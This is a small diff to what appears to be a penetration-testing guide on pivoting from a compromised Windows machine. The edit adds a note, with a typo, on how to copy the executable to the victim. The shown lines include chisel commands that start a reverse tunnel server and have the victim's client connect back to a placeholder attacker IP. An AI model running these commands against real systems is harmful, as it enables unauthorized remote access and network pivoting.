@@ -54,7 +54,7 @@ Compromised Windows machine must be accessible with valid credentials.
    ```bash
    ./chisel server --port 5000 --reverse
    ```
-   - Copy the exe version to victim computer and execute it:
+   - Copy the exe version to victim computern(copy, shared folder, python server..)  and execute it:
    ```bash
    .\chisel.exe client <ATTACKER_IP>:5000 R:8888:127.0.0.1:8000
    ```
